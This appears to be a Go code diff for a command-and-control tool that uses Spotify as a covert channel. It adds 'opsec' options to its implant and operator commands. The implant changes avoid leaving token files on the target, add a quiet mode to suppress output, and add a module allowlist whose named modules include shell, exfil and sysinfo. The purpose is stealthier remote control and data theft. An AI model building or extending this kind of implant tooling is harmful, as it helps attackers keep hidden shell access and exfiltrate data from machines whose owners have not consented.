@@ -178,7 +178,8 @@ func cleanCmd() *cobra.Command {
 
 func c2ImplantCmd() *cobra.Command {
 	var interval, jitter int
-	var pluginDir string
+	var pluginDir, tokenFile, modules string
+	var quiet bool
 
 	cmd := &cobra.Command{
 		Use:   "c2-implant",
@@ -204,12 +205,34 @@ func c2ImplantCmd() *cobra.Command {
 				return err
 			}
 
-			client, err := spotify.NewClient(cfg, true)
+			// Implant opsec: never run interactive OAuth on the target,
+			// never drop a token cache file on disk. The token must be
+			// pre-staged (SPOTIFY_TOKEN_JSON, --token-file, or .cache).
+			client, err := spotify.NewClientWithOptions(cfg, spotify.ClientOptions{
+				UseCoverNames: true,
+				AllowOAuth:    false,
+				PersistToken:  false,
+				TokenFile:     tokenFile,
+			})
 			if err != nil {
 				return err
 			}
 
-			implant := c2.NewImplant(client, key, interval, jitter)
+			var allowed []string
+			if modules != "" {
+				for _, m := range strings.Split(modules, ",") {
+					if m = strings.TrimSpace(m); m != "" {
+						allowed = append(allowed, m)
+					}
+				}
+			}
+
+			implant := c2.NewImplantWithOptions(client, key, c2.ImplantOptions{
+				Interval:       interval,
+				Jitter:         jitter,
+				Quiet:          quiet,
+				AllowedModules: allowed,
+			})
 			implant.Run()
 			return nil
 		},
@@ -218,6 +241,9 @@ func c2ImplantCmd() *cobra.Command {
 	cmd.Flags().IntVar(&interval, "interval", shared.Proto.C2.DefaultInterval, "Polling interval (seconds)")
 	cmd.Flags().IntVar(&jitter, "jitter", shared.Proto.C2.DefaultJitter, "Jitter range (seconds)")
 	cmd.Flags().StringVar(&pluginDir, "plugin-dir", "", "Directory containing .so plugin modules")
+	cmd.Flags().StringVar(&tokenFile, "token-file", "", "Path to pre-staged Spotify token JSON (or use SPOTIFY_TOKEN_JSON)")
+	cmd.Flags().BoolVarP(&quiet, "quiet", "q", false, "Suppress non-error output (opsec)")
+	cmd.Flags().StringVar(&modules, "modules", "", "Comma-separated module allowlist (e.g. shell,exfil,sysinfo,push) — empty = all")
 
 	return cmd
 }
@@ -226,6 +252,7 @@ func c2OperatorCmd() *cobra.Command {
 	var key, keyFile string
 	var pollInterval int
 	var persistSession bool
+	var tokenFile string
 
 	cmd := &cobra.Command{
 		Use:   "c2-operator",
@@ -258,7 +285,12 @@ func c2OperatorCmd() *cobra.Command {
 				return err
 			}
 
-			client, err := spotify.NewClient(cfg, true)
+			client, err := spotify.NewClientWithOptions(cfg, spotify.ClientOptions{
+				UseCoverNames: true,
+				AllowOAuth:    true,
+				PersistToken:  true,
+				TokenFile:     tokenFile,
+			})
 			if err != nil {
 				return err
 			}
@@ -274,6 +306,7 @@ func c2OperatorCmd() *cobra.Command {
 	cmd.Flags().IntVar(&pollInterval, "poll-interval", 30, "Background poll interval in seconds (default 30)")
 	cmd.Flags().BoolVar(&persistSession, "persist-session", false,
 		"Persist session keys (encrypted) across restarts for result recovery (weakens forward secrecy)")
+	cmd.Flags().StringVar(&tokenFile, "token-file", "", "Path to pre-staged Spotify token JSON (or use SPOTIFY_TOKEN_JSON)")
 
 	return cmd
 }
